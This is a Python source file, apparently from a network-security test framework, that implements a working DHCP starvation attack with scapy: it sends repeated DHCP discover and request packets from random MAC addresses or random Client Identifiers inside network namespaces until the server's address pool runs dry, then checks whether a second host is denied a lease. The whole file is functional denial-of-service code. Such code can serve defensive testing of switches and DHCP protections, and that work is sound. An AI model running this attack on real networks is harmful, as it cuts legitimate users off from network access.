from attacks.attack import Attack
import netns
import scapy.all as scapy
import ipaddress
from lib.helper import random_unicast_mac

class DHCPStarvation(Attack):
    """
    Perform a DHCP Starvation Attach against an existing DHCP Server.

    Sends several DHCP Requests with different MAC addresses to exhaust the DHCP pool.

    Configuration allows 'identifier' option which can have the values 'mac' or 'clientID'.
    The option 'mac' uses a randomized MAC address as source of the DHCP Frame.
    The option 'identifier' uses the real MAC address of the interface but a randomized Client Identifier (DHCP Option 61).
    """

    def __init__(self, config: dict, interfaces: list[scapy.NetworkInterface], ip4network: ipaddress.IPv4Network):
        super().__init__(config, interfaces, ip4network)
        if self.config.get('identifier'):
            self.identifier = self.config.get('identifier')
        else:
            self.identifier = 'mac'

    def dhcp_request(self, nsname='host0', hw=None, timeout=25, *args, **kwargs) -> scapy.Packet | None:
        with netns.NetNS(nsname=nsname):
            scapy.conf.ifaces.reload()
            scapy.conf.route.resync()
            scapy.conf.checkIPaddr = False
            return scapy.dhcp_request(hw=hw, timeout=timeout, retry=2, *args, **kwargs)

    def dhcp_request_one_hw(self, interface,
                            nsname,
                            req_type='discover',
                            client_id=None,
                            requested_addr=None,
                            timeout=25,
                            *args,
                            **kwargs) -> scapy.Packet | None:
        with netns.NetNS(nsname=nsname):
            scapy.conf.ifaces.reload()
            scapy.conf.route.resync()
            scapy.conf.checkIPaddr = False
            dhcp_options = [
                ('message-type', req_type),
                ('client_id', client_id),
            ]
            if requested_addr is not None:
                dhcp_options.append(('requested_addr', requested_addr))
            dhcp_options.extend([
                ('vendor_class_id', b'MSFT 5.0'),
                ('param_req_list', [
                    1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252
                ]),
                'end'
            ])

            return scapy.srp1(
                scapy.Ether(dst="ff:ff:ff:ff:ff:ff", src=interface.mac) /
                scapy.IP(src="0.0.0.0", dst="255.255.255.255") /
                scapy.UDP(sport=68, dport=67) /
                scapy.BOOTP(chaddr=scapy.mac2str(interface.mac), xid=scapy.RandInt(), flags='B') /
                scapy.DHCP(options=dhcp_options),
                timeout=timeout,
                iface=interface.name,
                retry=2,
                *args,
                **kwargs
            )

    def setup(self) -> bool:
        """
        Check if a DHCP server answers.
        :return: True if DHCP lease can be acquired otherwise False
        """
        ans = self.dhcp_request(nsname='host0')
        ans2 = self._check_second_interface()
        if ans is None or ans2 is None:
            return False
        else:
            return True

    def attack(self, fails: int) -> int:
        """
        Tries to acquire as many DHCP leases as possible and returns the number
        of successfully acquired leases.
        :param fails: Number of consecutive DHCP lease acquires that may fail
        :return: Number of acquired leases
        """
        num_fail = 0
        num_leases = 0
        while True:
            mac = random_unicast_mac()
            if self.identifier == 'mac':
                ans = self.dhcp_request(nsname='host0', hw=mac)
            elif self.identifier == 'clientID':
                ans = self.dhcp_request_one_hw(interface=self.interfaces[0],
                                           nsname='host0',
                                           client_id=b'\x01'+mac
                                           )
            if ans is None:
                num_fail += 1
            else:
                adr = ans.getlayer(scapy.BOOTP).yiaddr
                if self.identifier == 'mac':
                    ans = self.dhcp_request(hw=mac,
                                            req_type='request',
                                            requested_addr=adr,
                                            timeout=5)
                elif self.identifier == 'clientID':
                    ans = self.dhcp_request_one_hw(interface=self.interfaces[0],
                                            nsname='host0',
                                            client_id=b'\x01'+mac,
                                            req_type='request',
                                            requested_addr=adr,
                                            timeout=5)
                if ans is None:
                    num_fail += 1
                else:
                    num_fail = 0
                    num_leases += 1
            if num_fail > fails:
                return num_leases

    def _check_second_interface(self) -> bool:
        mac = random_unicast_mac()
        ans = self.dhcp_request(nsname='host2', hw=mac)
        if ans is None:
            return False
        else:
            return True

    def run(self) -> bool:
        """
        Run DHCP Starvation attack.
        :return: Bool which indicates success of the attack
        """
        if not self.setup():
            raise RuntimeError("No answering DHCP Server in the network.")
        num_leases = self.attack(5)
        #print(f"{num_leases} DHCP Leases acquired.")
        notempty = self._check_second_interface()
        if notempty:
            return False
        else:
            return True

